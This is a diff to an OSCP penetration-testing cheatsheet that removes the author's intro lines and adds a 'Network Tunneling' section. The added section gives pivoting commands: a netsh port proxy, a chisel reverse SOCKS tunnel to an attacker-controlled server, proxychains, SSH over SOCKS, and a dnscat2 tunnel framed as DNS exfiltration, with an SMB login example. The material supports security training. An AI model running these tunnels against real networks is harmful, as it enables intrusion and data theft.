@@ -1,10 +1,5 @@
 # 📚 OSCP Cheatsheet
 
-- 🚀 Prepared as part of my OSCP journey.
-- 🔄 Continuously updated.
-- 📬 Feel free to email me with suggestions: [contact.saisathvik@gmail.com](mailto:contact.saisathvik@gmail.com)
-
-
 # Table of Content
 - [General](#general)
   - [Important Locations](#important-locations)
@@ -75,6 +70,7 @@
   - [Sudo/SUID/Capabilities](#sudosuidcapabilities)
   - [Cron Jobs](#cron-jobs)
   - [NFS](#nfs)
+- [Network Tunneling](#network-tunneling)
 - [Post Exploitation](#post-exploitation)
   - [Sensitive Information](#sensitive-information-1)
     - [Powershell History](#powershell-history)
@@ -1469,7 +1465,29 @@ mount -o rw <targetIP>:<share-location> <directory path we created>
 chmod +x <binary>
 ```
 
+# Network Tunneling
+```bash
+#Windows netsh
+netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=<dest_ip> #Listen on port 2222 and forward packets to port 22 on dest server
 
+#Chiesel SOCKS5 TCP/UDP tunnel over HTTP
+./chisel server -p 8080 --reverse #Server controled by attacker
+chisel.exe client <Server IP>:8080 R:socks #Pnwed client
+
+#Proxychains
+proxychains <command to tunnel> # Add -q to ommit proxychains output
+
+#Tunnel SSH through SOCKS proxy
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<server> #Needs Nmap version of ncat
+
+#dnscat2 tunnel over DNS
+dnscat2-server <domain to use for exfiltration> #Server
+./dnscat feline.corp #Compromised host
+# On the server we will have an interactive command line
+window -i 1 # To select our established session
+listen 127.0.0.1:4455 172.16.2.11:445 # To set up a port forward via DNS packets (like ssh -L)
+# We can then do something like smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+```
 
 # Post Exploitation
 
